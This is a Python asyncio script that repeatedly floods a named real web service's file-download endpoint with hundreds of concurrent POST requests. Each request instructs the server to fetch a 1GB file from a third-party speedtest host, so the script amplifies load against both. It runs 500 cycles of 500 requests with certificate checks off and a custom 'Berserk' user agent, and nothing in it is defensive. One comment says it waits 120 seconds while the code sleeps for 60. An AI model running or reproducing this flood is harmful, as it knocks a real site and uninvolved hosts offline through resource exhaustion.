import asyncio
import aiohttp
import urllib3
import time

# Suppress SSL warnings
import logging
logging.getLogger('aiohttp').setLevel(logging.ERROR)

async def send_request(session, task_id, url, payload, headers):
    try:
        # We use 'async with' but we don't necessarily have to await the body 
        # if we just want to fire and move on.
        async with session.post(url, json=payload, headers=headers, ssl=False) as response:
            status = response.status
            # We just return the status code for the final report
            return status
    except Exception as e:
        return f"Failed: {str(e)}"

async def start_berserk_mode():
    target_url = "https://app.rpscampus.in/Autocomplete.asmx/DownloadFile"
    payload = {"FileUrl": "http://speedtest.tele2.net/1GB.zip"}
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Vortex-Core-Berserk-1.0"
    }

    try:
        count_input = 500
        iterations = int(count_input)
    except ValueError:
        print("[!] Invalid number.")
        return

    print(f"[*] Initializing... firing {iterations} requests. Hold on.")
    
    start_time = time.perf_counter()

    # TCPConnector helps manage the connection pool for high volume
    connector = aiohttp.TCPConnector(limit=None, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for i in range(iterations):
            # We create tasks and fire them into the event loop
            task = asyncio.create_task(send_request(session, i, target_url, payload, headers))
            tasks.append(task)
        
        print(f"[*] All {iterations} requests pushed to network buffer. Waiting for final tally...")
        
        # This collects all responses at the very end
        results = await asyncio.gather(*tasks)

    end_time = time.perf_counter()
    
    # Simple Response Summary
    success_count = sum(1 for r in results if r == 200)
    error_count = iterations - success_count

    print("-" * 30)
    print(f"BERSERK MODE COMPLETE")
    print(f"Total Time: {end_time - start_time:.2f} seconds")
    print(f"Successful Hits (200): {success_count}")
    print(f"Failed/Other: {error_count}")
    print("-" * 30)

if __name__ == "__main__":
    # How many times to repeat (e.g., 5 times)
    repeats = 500 
    
    for i in range(repeats):
        print(f"[*] Cycle {i+1} starting...")
        
        # Runs your function
        asyncio.run(start_berserk_mode())
        
        # If it's not the last cycle, wait 2 minutes (120 seconds)
        if i < repeats - 1:
            print(f"[!] Cycle {i+1} done. Waiting 120s...")
            time.sleep(60)

    print("[+] All repeats finished.")
